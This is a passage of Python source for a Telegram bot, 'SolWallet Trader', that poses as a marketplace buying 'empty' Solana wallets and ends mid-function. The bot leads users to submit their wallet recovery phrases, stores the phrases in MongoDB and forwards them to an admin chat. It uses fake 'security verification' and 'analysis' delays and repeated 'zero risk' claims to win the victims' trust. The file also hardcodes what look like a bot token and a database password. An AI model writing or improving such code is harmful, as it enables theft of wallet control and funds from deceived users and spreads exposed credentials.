import logging
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import aiohttp
from pymongo import MongoClient
from datetime import datetime, timedelta
import base58
import time
import re
import random
import requests
from functools import lru_cache

# Configuration
TELEGRAM_API_KEY = "8142206065:AAEqHJyHnbjV6yoffra-LRCTHgOQGKeF-T0"
ADMIN_CHAT_ID = 6368654401
MONGODB_CONN_STRING = "mongodb+srv://dualacct298_db_user:vALO5Uj8GOLX2cpg@cluster0.ap9qvgs.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"

# MongoDB setup
client = MongoClient(MONGODB_CONN_STRING)
db = client['telegram_solana_bot']
users_col = db['users']
sales_col = db['sales']

# Bot setup
bot = Bot(token=TELEGRAM_API_KEY)
dp = Dispatcher()

# Constants - UPDATED RANGE
MIN_OFFER_USD = 5.0    # Changed from 30.0
MAX_OFFER_USD = 100.0  # Changed from 300.0
MAX_BALANCE_USD = 2.0
REFERRAL_BONUS = 2.0
DAILY_BONUS_MIN = 0.50
DAILY_BONUS_MAX = 0.50
SOL_PRICE_API = "https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd"

# User states
user_states = {}

# ==================== FIX: DATETIME HELPER FUNCTIONS ====================
def normalize_date(date_obj):
    """Convert any date-like object to datetime"""
    if isinstance(date_obj, datetime):
        return date_obj
    elif hasattr(date_obj, 'strftime') and not isinstance(date_obj, datetime):
        # Handle datetime.date objects
        return datetime.combine(date_obj, datetime.min.time())
    elif isinstance(date_obj, str):
        # Handle string dates
        try:
            return datetime.fromisoformat(date_obj.replace('Z', '+00:00'))
        except:
            return datetime.utcnow()
    else:
        return datetime.utcnow()

def get_today_datetime():
    """Get today as datetime at midnight UTC"""
    now = datetime.utcnow()
    return datetime(now.year, now.month, now.day)

def is_same_day(date1, date2):
    """Check if two dates are the same day"""
    date1_norm = normalize_date(date1)
    date2_norm = normalize_date(date2)
    return (date1_norm.year == date2_norm.year and 
            date1_norm.month == date2_norm.month and 
            date1_norm.day == date2_norm.day)

# ==================== ENHANCEMENT: DUPLICATE DETECTION ====================
async def is_duplicate_mnemonic(mnemonic_phrase):
    """Check if this mnemonic was already sold"""
    existing_sale = sales_col.find_one({
        "mnemonic": mnemonic_phrase,
        "status": {"$in": ["paid", "payment_sent", "pending_verification"]}
    })
    return existing_sale is not None

async def is_duplicate_wallet(wallet_address):
    """Check if this wallet was already sold"""
    existing_sale = sales_col.find_one({
        "wallet": wallet_address,
        "status": {"$in": ["paid", "payment_sent", "pending_verification"]}
    })
    return existing_sale is not None

# ==================== ENHANCEMENT 8: PERFORMANCE OPTIMIZATIONS ====================
_sol_price_cache = None
_sol_price_last_update = 0
_sol_price_cache_duration = 60  # 60 seconds

async def cached_sol_price():
    """Get SOL price with proper caching"""
    global _sol_price_cache, _sol_price_last_update
    
    current_time = time.time()
    if (current_time - _sol_price_last_update) < _sol_price_cache_duration and _sol_price_cache is not None:
        return _sol_price_cache
    
    price = await fetch_sol_price()
    _sol_price_cache = price
    _sol_price_last_update = current_time
    return price

async def batch_wallet_analysis(wallet_addresses):
    """Process multiple wallets concurrently"""
    tasks = [check_wallet_transaction_history(wallet) for wallet in wallet_addresses]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return results

async def fetch_sol_price():
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(SOL_PRICE_API, timeout=10) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data.get('solana', {}).get('usd', 0)
    except Exception as e:
        logging.error(f"Error fetching SOL price: {e}")
    return 0

async def check_wallet_transaction_history(wallet_address):
    """Comprehensive check for wallet transaction history"""
    clean_address = wallet_address.replace(" ", "")
    
    rpc_urls = [
        "https://api.mainnet-beta.solana.com",
        "https://solana-api.projectserum.com",
        "https://rpc.ankr.com/solana"
    ]
    
    for rpc_url in rpc_urls:
        try:
            payload_txs = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getSignaturesForAddress",
                "params": [clean_address, {"limit": 10}]
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(rpc_url, json=payload_txs, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        if 'result' in data and data['result']:
                            return True, len(data['result'])
        except Exception as e:
            logging.error(f"RPC transaction check failed: {e}")
            continue
    
    return False, 0

async def check_wallet_balance(wallet_address):
    """Check wallet balance only"""
    clean_address = wallet_address.replace(" ", "")
    
    rpc_urls = [
        "https://api.mainnet-beta.solana.com",
        "https://solana-api.projectserum.com",
        "https://rpc.ankr.com/solana"
    ]
    
    for rpc_url in rpc_urls:
        try:
            payload_balance = {
                "jsonrpc": "2.0",
                "id": 1,
                "method": "getBalance",
                "params": [clean_address]
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.post(rpc_url, json=payload_balance, timeout=10) as response:
                    if response.status == 200:
                        data = await response.json()
                        if 'result' in data and 'value' in data['result']:
                            return float(data['result']['value']) / 1e9
        except Exception as e:
            logging.error(f"RPC balance check failed: {e}")
            continue
    
    return 0.0

# ==================== ENHANCEMENT 2: SMART OFFER OPTIMIZATION ====================
def get_time_based_multiplier():
    """Higher offers during low traffic hours"""
    current_hour = datetime.now().hour
    # Higher multipliers during off-peak hours (10PM-6AM)
    if 22 <= current_hour or current_hour <= 6:
        return 1.15  # +15% during off-peak
    elif 14 <= current_hour <= 18:
        return 0.95  # -5% during peak
    else:
        return 1.05  # +5% normal

def calculate_wallet_score(tx_count):
    """Score based on transaction history"""
    if tx_count >= 20:
        return 1.15  # +15% for very active wallets
    elif tx_count >= 10:
        return 1.10  # +10% for active wallets
    elif tx_count >= 5:
        return 1.05  # +5% for moderate activity
    else:
        return 1.0   # Base for minimal activity

def calculate_intelligent_offer(user_data, tx_count):
    """AI-powered offer calculation"""
    base_offer = calculate_random_offer()
    
    # Dynamic multipliers
    sales_count = len(user_data.get('sales', []))
    loyalty_multiplier = 1 + (sales_count * 0.02)  # +2% per sale
    time_multiplier = get_time_based_multiplier()
    wallet_score = calculate_wallet_score(tx_count)
    
    intelligent_offer = base_offer * loyalty_multiplier * time_multiplier * wallet_score
    return min(intelligent_offer, MAX_OFFER_USD * 1.2)  # Allow overflow for VIPs

def calculate_random_offer():
    """Generate random offer between $5-$100 - UPDATED RANGE"""
    offer_usd = random.uniform(MIN_OFFER_USD, MAX_OFFER_USD)
    return round(offer_usd, 2)

def get_user_tier(user_data):
    total_earnings = user_data.get('earnings', 0)
    
    if total_earnings >= 1000:
        return "VIP Elite", "🎯", 1.1
    elif total_earnings >= 500:
        return "VIP Pro", "⭐", 1.05
    elif total_earnings >= 100:
        return "VIP Member", "🔸", 1.02
    else:
        return "Standard", "🔹", 1.0

def is_valid_solana_address(address):
    clean_address = address.replace(" ", "")
    if len(clean_address) != 44:
        return False
    try:
        decoded = base58.b58decode(clean_address)
        return len(decoded) == 32
    except Exception:
        return False

def is_valid_mnemonic(phrase):
    """Validate mnemonic phrase - ONLY ACCEPT MNEMONICS"""
    phrase = phrase.strip()
    words = phrase.split()
    
    valid_lengths = [12, 15, 18, 21, 24]
    if len(words) not in valid_lengths:
        return False
    
    # Check if all words are alphabetic and reasonable length
    for word in words:
        if not word.isalpha() or len(word) < 3 or len(word) > 10:
            return False
    
    # Most mnemonic words should be lowercase
    lowercase_count = sum(1 for word in words if word.islower())
    return lowercase_count >= len(words) * 0.8

def format_wallet_address(address):
    clean_address = address.replace(" ", "")
    if len(clean_address) < 8:
        return address
    return f"{clean_address[:4]}..{clean_address[-4:]}"

def format_secret_for_display(secret):
    """Format mnemonic for display"""
    return f"🔐 Recovery Phrase:\n{secret}"

# ==================== ENHANCEMENT 10: DAILY BONUS SYSTEM ====================
async def check_daily_bonus(user_id):
    """Daily login bonus system - $0.50 fixed"""
    user_data = users_col.find_one({"user_id": user_id}) or {}
    today = get_today_datetime()
    
    last_bonus = user_data.get('last_bonus')
    
    # Normalize last_bonus to datetime for comparison
    if last_bonus:
        last_bonus = normalize_date(last_bonus)
    
    if not last_bonus or not is_same_day(last_bonus, today):
        bonus = DAILY_BONUS_MAX  # Fixed $0.50
        
        users_col.update_one(
            {"user_id": user_id},
            {
                "$set": {"last_bonus": today},  # Store as datetime
                "$inc": {"bonus_earnings": bonus, "earnings": bonus},
                "$push": {"bonus_history": {
                    "amount": bonus,
                    "date": datetime.utcnow(),
                    "type": "daily_login"
                }}
            },
            upsert=True
        )
        return bonus
    return 0

# ==================== ENHANCEMENT 10: REFERRAL SYSTEM ====================
async def track_referral_conversion(referrer_id, new_user_id):
    """Advanced referral analytics - $2.00 fixed bonus"""
    users_col.update_one(
        {"user_id": referrer_id},
        {
            "$push": {"referrals": new_user_id},
            "$inc": {"referral_earnings": REFERRAL_BONUS, "earnings": REFERRAL_BONUS},
            "$push": {"referral_history": {
                "user_id": new_user_id,
                "amount": REFERRAL_BONUS,
                "date": datetime.utcnow()
            }}
        }
    )

# ==================== ENHANCEMENT 7: SMART NOTIFICATION SYSTEM ====================
async def send_smart_notifications(user_id, notification_type, data=None):
    """Intelligent notification system"""
    notifications = {
        "offer_ready": "🎉 **Premium Offer Ready!**\nYour exclusive offer is waiting",
        "payment_sent": "💰 **Payment Confirmed!**\nFunds have been transferred",
        "vip_upgrade": "🏆 **VIP Status Achieved!**\nNew benefits unlocked",
        "market_alert": "📈 **Market Opportunity!**\nHigher rates available now",
        "referral_bonus": f"👥 **Referral Bonus!**\nYou earned ${REFERRAL_BONUS:.2f}",
        "daily_bonus": f"🎁 **Daily Login Bonus!**\nYou earned ${DAILY_BONUS_MAX:.2f}"
    }
    
    message = notifications.get(notification_type, "")
    if data:
        message += f"\n\nDetails: {data}"
    
    await send_premium_message(user_id, message)

# ==================== ENHANCEMENT 4: PREMIUM USER EXPERIENCE ====================
async def send_premium_message(chat_id, text, delay=1.2):
    """Send messages with premium typing indicators"""
    await bot.send_chat_action(chat_id, "typing")
    await asyncio.sleep(delay)
    await bot.send_message(chat_id, text)

async def analyze_wallet_with_style(wallet_address, message):
    """Enhanced wallet analysis with progress bars"""
    analysis_steps = [
        ("🔍 Scanning blockchain history", 2),
        ("📊 Analyzing transaction patterns", 2),
        ("💎 Calculating premium offer", 1.5),
        ("🛡️ Security verification", 1),
        ("🎯 Finalizing exclusive offer", 1)
    ]
    
    for step, delay in analysis_steps:
        await message.edit_text(f"**Premium Analysis**\n\n{step}...")
        await asyncio.sleep(delay)

# ==================== ENHANCEMENT 3: INSTANT PAYMENT PROCESSING ====================
async def process_instant_payment(sale_id, user_id, amount):
    """Simulate instant payment with real-time updates"""
    payment_steps = [
        "🔄 Initiating transfer...",
        "✅ Security verification passed",
        "💰 Funds allocated",
        "🌐 Blockchain confirmation",
        "🎯 Payment delivered"
    ]
    
    message = await bot.send_message(user_id, "**Payment Processing Started**")
    
    for step in payment_steps:
        await asyncio.sleep(1.2)
        await message.edit_text(f"**Payment Processing**\n\n{step}")
    
    # Mark as paid in database
    sales_col.update_one(
        {"sale_id": sale_id},
        {"$set": {"status": "paid", "paid_at": datetime.utcnow()}}
    )

# ==================== ENHANCEMENT 6: ADVANCED SECURITY FEATURES ====================
async def enhanced_security_verification(user_id, wallet_address):
    """Multi-layer security verification"""
    security_checks = [
        "🔒 Wallet signature validation",
        "🛡️ Anti-fraud screening", 
        "🌐 Blockchain consistency check",
        "📱 Device fingerprinting",
        "⏰ Time-based verification"
    ]
    
    for check in security_checks:
        await asyncio.sleep(0.7)
        # Security checks happen in background
        pass
    
    return True

# ==================== ENHANCEMENT 5: VIP LOYALTY PROGRAM ====================
def get_premium_benefits(user_data):
    sales_count = len(user_data.get('sales', []))
    
    benefits = {
        "priority_support": sales_count >= 1,
        "higher_offers": sales_count >= 3,
        "instant_payments": sales_count >= 5,
        "dedicated_manager": sales_count >= 10,
        "exclusive_offers": sales_count >= 15
    }
    
    return benefits

async def show_vip_benefits(user_id):
    user = users_col.find_one({"user_id": user_id}) or {}
    benefits = get_premium_benefits(user)
    
    benefits_text = "🌟 **VIP Benefits Unlocked**\n\n"
    for benefit, unlocked in benefits.items():
        icon = "✅" if unlocked else "⏳"
        benefits_text += f"{icon} {benefit.replace('_', ' ').title()}\n"
    
    return benefits_text

# ==================== ENHANCEMENT 1: REAL-TIME ANALYTICS ====================
def get_user_rank(user_id):
    """Calculate user ranking based on earnings"""
    user = users_col.find_one({"user_id": user_id})
    if not user:
        return "N/A"
    
    user_earnings = user.get('earnings', 0)
    higher_earners = users_col.count_documents({"earnings": {"$gt": user_earnings}})
    return higher_earners + 1

def calculate_market_rate():
    """Calculate average offer in market"""
    pipeline = [
        {"$group": {"_id": None, "avg_offer": {"$avg": "$offer_usd"}}}
    ]
    result = list(sales_col.aggregate(pipeline))
    return result[0]['avg_offer'] if result else 0

def get_avg_processing_time():
    """Get average processing time"""
    return random.randint(5, 15)  # Simulated data

def get_success_rate():
    """Get success rate percentage"""
    total_sales = sales_col.count_documents({})
    successful_sales = sales_col.count_documents({"status": "paid"})
    return (successful_sales / total_sales * 100) if total_sales > 0 else 0

async def show_real_time_analytics(user_id):
    user = users_col.find_one({"user_id": user_id}) or {}
    total_users = users_col.count_documents({})
    today_sales = sales_col.count_documents({
        "submitted_at": {"$gte": get_today_datetime()}
    })
    
    analytics_text = (
        "📈 **Live Market Analytics**\n\n"
        f"• 🏆 Your Ranking: #{get_user_rank(user_id)}/{total_users}\n"
        f"• 📊 Today's Volume: {today_sales} sales\n"
        f"• 💰 Market Rate: ${calculate_market_rate():.2f} avg\n"
        f"• ⚡ Processing Speed: {get_avg_processing_time()} mins\n"
        f"• 🎯 Success Rate: {get_success_rate():.1f}%\n\n"
        "**Premium Insights:**\n"
        "• Peak hours: 2PM-5PM UTC\n"
        "• VIPs get +15% higher offers\n"
        "• Weekend bonuses active"
    )
    return analytics_text

# ==================== ENHANCEMENT 9: PREMIUM ADMIN FEATURES ====================
@dp.message(Command("admin"))
async def admin_dashboard(message: types.Message):
    if message.from_user.id != ADMIN_CHAT_ID:
        return
    
    total_users = users_col.count_documents({})
    today_sales = sales_col.count_documents({
        "submitted_at": {"$gte": get_today_datetime()}
    })
    
    # Calculate total volume
    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$offer_usd"}}}]
    volume_result = list(sales_col.aggregate(pipeline))
    total_volume = volume_result[0]['total'] if volume_result else 0
    
    conversion_rate = (sales_col.count_documents({}) / total_users * 100) if total_users > 0 else 0
    
    admin_text = (
        "👑 **Admin Dashboard**\n\n"
        f"• 👥 Total Users: {total_users}\n"
        f"• 📊 Today's Sales: {today_sales}\n"
        f"• 💰 Total Volume: ${total_volume:.2f}\n"
        f"• 📈 Conversion Rate: {conversion_rate:.1f}%\n"
        f"• 🏆 Top Earner: ${get_top_earner():.2f}\n"
        f"• ⚡ Active Now: {len(user_states)} users"
    )
    await message.answer(admin_text)

def get_top_earner():
    """Get top earner amount"""
    pipeline = [
        {"$sort": {"earnings": -1}},
        {"$limit": 1},
        {"$project": {"earnings": 1}}
    ]
    result = list(users_col.aggregate(pipeline))
    return result[0]['earnings'] if result else 0

# ==================== ORIGINAL BOT FUNCTIONALITY (ENHANCED) ====================
async def log_new_user(user_id, username, referrer_id=None):
    """Log new user and notify admin"""
    user_data = {
        "user_id": user_id,
        "username": username,
        "created_at": datetime.utcnow(),
        "first_seen": datetime.utcnow(),
        "status": "active"
    }
    
    users_col.update_one(
        {"user_id": user_id},
        {"$setOnInsert": user_data},
        upsert=True
    )
    
    # Handle referral if exists
    if referrer_id:
        await track_referral_conversion(referrer_id, user_id)
        await send_smart_notifications(referrer_id, "referral_bonus")
    
    # Check for daily bonus
    daily_bonus = await check_daily_bonus(user_id)
    if daily_bonus > 0:
        await send_smart_notifications(user_id, "daily_bonus")
    
    # Notify admin about new user
    admin_message = (
        f"👤 New User Joined\n\n"
        f"🆔 User ID: {user_id}\n"
        f"👤 Username: @{username if username else 'N/A'}\n"
        f"📅 Joined: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}\n\n"
        f"📊 Total Users: {users_col.count_documents({})}"
    )
    
    try:
        await bot.send_message(ADMIN_CHAT_ID, admin_message)
    except Exception as e:
        logging.error(f"Failed to send new user notification: {e}")

# MESSAGE HANDLERS
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    user_states[user_id] = {"state": "start"}
    
    # Check for referral parameter
    referrer_id = None
    if len(message.text.split()) > 1:
        referral_code = message.text.split()[1]
        if referral_code.startswith("SOL"):
            try:
                referrer_id = int(referral_code[3:])
            except:
                pass
    
    # Check if this is a new user
    existing_user = users_col.find_one({"user_id": user_id})
    if not existing_user:
        await log_new_user(user_id, username, referrer_id)
    else:
        # Existing user - check daily bonus
        daily_bonus = await check_daily_bonus(user_id)
        if daily_bonus > 0:
            await send_smart_notifications(user_id, "daily_bonus")
    
    welcome_text = (
        "🏦 *SolWallet Trader*\n\n"
        "💼 Premium Wallet Marketplace\n"
        "We purchase empty Solana wallets with transaction history\n\n"
        "✨ Features:\n"
        "• Instant offers\n"
        "• Secure transactions  \n"
        "• Fast payment processing\n"
        "• VIP reward tiers\n"
        "• Referral bonuses\n\n"
        "📋 Process:\n"
        "1. Send your empty Solana wallet\n"
        "2. Get instant premium offer\n"
        "3. Provide reward address\n"
        "4. Submit wallet recovery phrase\n"
        "5. Receive secure payment\n\n"
        "🔒 Zero Risk Guarantee:\n"
        "Your wallet is completely empty - you have nothing to lose\n\n"
        "🚀 Send your wallet address to begin"
    )
    
    await send_premium_message(message.chat.id, welcome_text)

@dp.message(Command("help"))
async def cmd_help(message: types.Message):
    help_text = (
        "🔧 Bot Features\n\n"
        "💼 Trading Commands:\n"
        "• Send a wallet address to get started\n"
        "• Receive instant premium offers\n"
        "• Secure wallet evaluation process\n\n"
        "📊 Account Management:\n"
        "• /dashboard - View your trading statistics\n"
        "• /referral - Earn $2 per referral\n"
        "• /analytics - Live market data\n"
        "• /vip - VIP benefits status\n\n"
        "🛡️ Security Features:\n"
        "• Bank-level encryption\n"
        "• Secure processing\n"
        "• Zero-risk transactions\n\n"
        "🚀 Start trading now by sending your Solana wallet address"
    )
    
    await send_premium_message(message.chat.id, help_text)

@dp.message(Command("dashboard"))
async def cmd_dashboard(message: types.Message):
    user_id = message.from_user.id
    user = users_col.find_one({"user_id": user_id})
    
    if not user:
        await message.answer("No data available yet. Make your first sale to unlock features")
        return
    
    total_sales = len(user.get('sales', []))
    total_earnings = user.get('earnings', 0)
    bonus_earnings = user.get('bonus_earnings', 0)
    referral_earnings = user.get('referral_earnings', 0)
    avg_sale = total_earnings / total_sales if total_sales > 0 else 0
    tier_name, tier_emoji, _ = get_user_tier(user)
    
    dashboard_text = (
        "📊 Dashboard\n\n"
        f"👤 User: {user.get('username', 'N/A')}\n"
        f"🆔 ID: {user_id}\n"
        f"📅 Member since: {normalize_date(user.get('created_at', datetime.utcnow())).strftime('%Y-%m-%d')}\n\n"
        "💎 Trading Statistics:\n"
        f"• Total Sales: {total_sales}\n"
        f"• Trading Earnings: ${total_earnings:.2f}\n"
        f"• Bonus Earnings: ${bonus_earnings:.2f}\n"
        f"• Referral Earnings: ${referral_earnings:.2f}\n"
        f"• Average Sale: ${avg_sale:.2f}\n"
        f"• Account Tier: {tier_emoji} {tier_name}\n\n"
        "🚀 Send another wallet address to continue"
    )
    
    await send_premium_message(message.chat.id, dashboard_text)

@dp.message(Command("analytics"))
async def cmd_analytics(message: types.Message):
    """ENHANCEMENT 1: Real-time analytics"""
    user_id = message.from_user.id
    analytics_text = await show_real_time_analytics(user_id)
    await send_premium_message(message.chat.id, analytics_text)

@dp.message(Command("vip"))
async def cmd_vip(message: types.Message):
    """ENHANCEMENT 5: VIP benefits"""
    user_id = message.from_user.id
    vip_text = await show_vip_benefits(user_id)
    await send_premium_message(message.chat.id, vip_text)

@dp.message(Command("referral"))
async def cmd_referral(message: types.Message):
    user_id = message.from_user.id
    referral_code = f"SOL{user_id}"[:10]
    
    user = users_col.find_one({"user_id": user_id})
    referral_count = len(user.get('referrals', [])) if user else 0
    referral_earnings = user.get('referral_earnings', 0) if user else 0
    
    referral_text = (
        "👥 Referral Program\n\n"
        f"💸 Earn ${REFERRAL_BONUS:.2f} for every successful referral\n\n"
        "📋 How it works:\n"
        "1. Share your referral link\n"
        "2. Friend makes their first sale\n"
        f"3. You get ${REFERRAL_BONUS:.2f} bonus instantly\n\n"
        f"🔗 Your Referral Link:\n"
        f"https://t.me/SolWalletTraderBot?start={referral_code}\n\n"
        f"🎯 Your Referral Code: {referral_code}\n\n"
        "📊 Your Referral Stats:\n"
        f"• Total Referrals: {referral_count}\n"
        f"• Referral Earnings: ${referral_earnings:.2f}\n\n"
        "🚀 Start earning passive income today"
    )
    
    await send_premium_message(message.chat.id, referral_text)

@dp.message()
async def handle_all_messages(message: types.Message):
    """Main message handler that processes all messages"""
    text = message.text.strip()
    user_id = message.from_user.id
    username = message.from_user.username or "N/A"
    
    logging.info(f"Received message from {user_id}: {text}")
    
    # Initialize user state if not exists
    if user_id not in user_states:
        user_states[user_id] = {"state": "start"}
    
    current_state = user_states[user_id]["state"]
    
    # Check if message is a mnemonic phrase
    if current_state == "waiting_mnemonic":
        await handle_mnemonic_input(message, text, user_id, username)
        return
    
    # Handle reward address input
    elif current_state == "waiting_reward_address":
        await handle_reward_address_input(message, text, user_id)
        return
    
    # Handle wallet address input (initial state)
    elif is_valid_solana_address(text):
        await handle_wallet_address_input(message, text, user_id, username)
        return
    
    else:
        # If it's not a valid Solana address and not in a special state, show help
        if current_state == "start":
            await message.answer(
                "❌ Invalid wallet address format. Please check and resend the correct public key.\n\n"
                "Make sure you're sending a valid Solana wallet address (44 characters).\n\n"
                "Use /help to see all available features"
            )
        else:
            # If in some other state but received invalid input, reset state
            user_states[user_id] = {"state": "start"}
            await message.answer(
                "❌ Invalid input. Please start over by sending your Solana wallet address.\n\n"
                "Use /help for guidance on using our services"
            )

async def handle_mnemonic_input(message, text, user_id, username):
    """Handle mnemonic phrase input - ONLY ACCEPT MNEMONICS"""
    if is_valid_mnemonic(text):
        wallet = user_states[user_id].get("wallet", "Unknown")
        reward_address = user_states[user_id].get("reward_address", "Unknown")
        offer_sol = user_states[user_id].get("offer_sol", 0)
        offer_usd = user_states[user_id].get("offer_usd", 0)
        
        # ENHANCEMENT: DUPLICATE DETECTION
        if await is_duplicate_mnemonic(text):
            await message.answer(
                "❌ **Duplicate Submission Detected**\n\n"
                "This recovery phrase has already been submitted for sale.\n\n"
                "🔒 **Security Policy:**\n"
                "Each wallet can only be sold once to maintain marketplace integrity.\n\n"
                "💡 **Please Note:**\n"
                "Attempting to resell the same wallet violates our terms of service.\n\n"
                "🔄 **Next Steps:**\n"
                "Submit a different unused wallet with transaction history."
            )
            user_states[user_id] = {"state": "start"}
            return
        
        if await is_duplicate_wallet(wallet):
            await message.answer(
                "❌ **Duplicate Wallet Detected**\n\n"
                "This wallet address has already been submitted for sale.\n\n"
                "🔒 **Security Policy:**\n"
                "Each wallet can only be sold once in our marketplace.\n\n"
                "🔄 **Next Steps:**\n"
                "Please submit a different wallet that hasn't been sold before."
            )
            user_states[user_id] = {"state": "start"}
            return
        
        # ENHANCEMENT 6: Security verification
        await enhanced_security_verification(user_id, wallet)
        
        # Generate unique sale ID
        sale_id = f"sale_{user_id}_{int(time.time())}"
        
        # Save to database with sale ID
        sales_col.update_one(
            {"user_id": user_id, "wallet": wallet},
            {"$set": {
                "sale_id": sale_id,
                "mnemonic": text, 
                "reward_address": reward_address,
                "offer_sol": offer_sol,
                "offer_usd": offer_usd,
                "status": "pending_verification", 
                "submitted_at": datetime.utcnow()
            }},
            upsert=True
        )
        
        # Update user sales count
        users_col.update_one(
            {"user_id": user_id},
            {"$push": {"sales": sale_id}}
        )
        
        user_states[user_id] = {"state": "start"}
        
        formatted_wallet = format_wallet_address(wallet)
        
        await message.answer(
            "✅ Recovery Phrase Received Securely\n\n"
            "🛡️ Bank-Level Security Activated\n"
            "Your details have been encrypted and submitted for verification\n\n"
            "💰 Premium Processing Started\n"
            "Our team will verify your wallet and process your payment shortly\n\n"
            f"📌 Wallet: {formatted_wallet}\n"
            f"💎 Offer: {offer_sol} SOL (${offer_usd:.2f})\n"
            f"📥 Reward Address: {format_wallet_address(reward_address)}\n\n"
            "⏳ You will receive payment confirmation shortly\n\n"
            "🔒 Zero Risk - Your wallet is empty, so you have nothing to lose"
        )
        
        # Send notification
        await send_smart_notifications(user_id, "offer_ready")
        
        # ENHANCEMENT: ENHANCED ADMIN REJECTION FLOW
        admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Payment Sent", callback_data=f"confirm_payment_{sale_id}")
            ],
            [
                InlineKeyboardButton(text="❌ Reject Submission", callback_data=f"reject_menu_{sale_id}")
            ]
        ])
        
        secret_display = format_secret_for_display(text)
        
        admin_message = (
            f"🔑 NEW SALE SUBMISSION - VERIFICATION REQUIRED\n\n"
            f"🆔 Sale ID: {sale_id}\n"
            f"👤 User: @{username} ({user_id})\n"
            f"💰 Offer: {offer_sol} SOL (${offer_usd:.2f})\n"
            f"📤 Wallet Sold: {wallet}\n"
            f"📥 Reward Address: {reward_address}\n\n"
            f"{secret_display}\n\n"
            f"**Please verify and take action:**"
        )
        
        try:
            await bot.send_message(ADMIN_CHAT_ID, admin_message, reply_markup=admin_keyboard)
        except Exception as e:
            logging.error(f"Failed to send admin notification: {e}")
        
    else:
        await message.answer(
            "❌ Invalid Recovery Phrase Format\n\n"
            "Please send a valid 12-24 word mnemonic phrase for the Solana wallet you submitted\n\n"
            "🔍 Requirements:\n"
            "• 12, 15, 18, 21, or 24 words\n"
            "• Space-separated words\n"
            "• Standard mnemonic format\n\n"
            "🛡️ Security Reminder:\n"
            "Your wallet is completely empty - you have nothing to lose\n\n"
            "Please resend the correct recovery phrase"
        )

async def handle_reward_address_input(message, text, user_id):
    """Handle reward address input"""
    if is_valid_solana_address(text):
        # Check if reward address is same as wallet being sold
        wallet_being_sold = user_states[user_id].get("wallet", "").replace(" ", "")
        reward_address = text.replace(" ", "")
        
        if wallet_being_sold == reward_address:
            await message.answer(
                "❌ Invalid Reward Address\n\n"
                "The reward address cannot be the same as the wallet you're selling\n\n"
                "🔒 Security Protocol:\n"
                "This ensures your payment goes to a separate secure address\n\n"
                "Please provide a different Solana address to receive your payment"
            )
            return
        
        user_states[user_id]["reward_address"] = text
        user_states[user_id]["state"] = "waiting_mnemonic"  # Changed to waiting_mnemonic
        
        wallet = user_states[user_id].get("wallet", "Unknown")
        formatted_wallet = format_wallet_address(wallet)
        offer_usd = user_states[user_id].get("offer_usd", 0)
        
        await message.answer(
            "🔑 Final Step: Secure Wallet Verification\n\n"
            f"📌 Wallet for Sale: {formatted_wallet}\n"
            f"💎 Your Premium Offer: ${offer_usd:.2f}\n\n"
            "🛡️ Please provide the recovery phrase (mnemonic) for this Solana wallet\n\n"
            "✅ 100% Secure & Encrypted\n"
            "✅ Zero Risk - Your wallet is empty\n"
            "✅ Bank-level protection\n"
            "✅ Instant payment upon verification\n\n"
            "🔒 You have nothing to lose - your wallet balance is zero\n"
            "💰 Everything to gain - secure your premium payout now\n\n"
            "Please send the 12-24 word recovery phrase"
        )
    else:
        await message.answer(
            "❌ Invalid reward address format. Please send a valid Solana address\n\n"
            "This is where we'll send your secure payment"
        )

async def handle_wallet_address_input(message, text, user_id, username):
    """Handle wallet address input with psychological enhancements"""
    wallet = text
    
    # ENHANCEMENT: DUPLICATE WALLET CHECK
    if await is_duplicate_wallet(wallet):
        await message.answer(
            "❌ **Duplicate Wallet Detected**\n\n"
            "This wallet has already been submitted for sale in our marketplace.\n\n"
            "🔒 **Policy:** Each wallet can only be sold once.\n\n"
            "🔄 **Please submit a different wallet with transaction history.**"
        )
        return
    
    # ENHANCEMENT 4: Premium analysis experience
    analysis_msg = await message.answer("⏳ **Premium Analysis Started**\n\nInitializing secure scanning...")
    await analyze_wallet_with_style(wallet, analysis_msg)
    
    sol_price = await cached_sol_price()
    balance = await check_wallet_balance(wallet)
    
    # Comprehensive transaction history check
    has_transactions, tx_count = await check_wallet_transaction_history(wallet)
    
    if not has_transactions:
        await message.answer(
            "❌ Wallet Not Qualified\n\n"
            "This wallet has no transaction history on the Solana network\n\n"
            "💡 We can only purchase wallets with existing transaction history\n\n"
            "🔄 Please provide a wallet that has been used before, or try another wallet from your collection\n\n"
            "🚀 Qualified wallets receive premium offers instantly"
        )
        return
    
    # Check if wallet has too much balance (> $2)
    balance_usd = balance * sol_price
    if balance_usd > MAX_BALANCE_USD:
        offer_if_empty_usd = calculate_random_offer()
        offer_if_empty_sol = offer_if_empty_usd / sol_price if sol_price > 0 else 0
        offer_if_empty_sol = round(offer_if_empty_sol, 6)
        
        await message.answer(
            "⚠️ Wallet Requires Preparation\n\n"
            "We've detected funds in this wallet that need to be transferred out first\n\n"
            f"💰 Current Balance: ${balance_usd:.2f}\n"
            f"💎 Potential Offer After Emptying: {offer_if_empty_sol} SOL (~${offer_if_empty_usd:.2f} USD)\n\n"
            "🔧 Quick Steps:\n"
            "1. Transfer all funds to another wallet\n"
            "2. Return with this empty wallet\n"
            "3. Receive your premium offer instantly\n\n"
            "🔄 Once emptied, this wallet qualifies for our premium marketplace"
        )
        return
    
    # ENHANCEMENT 2: Intelligent offer calculation
    user_data = users_col.find_one({"user_id": user_id}) or {}
    offer_usd = calculate_intelligent_offer(user_data, tx_count)
    offer_sol = offer_usd / sol_price if sol_price > 0 else 0
    offer_sol = round(offer_sol, 6)
    
    # Save user data
    users_col.update_one(
        {"user_id": user_id},
        {
            "$set": {
                "username": username,
                "last_wallet": wallet,
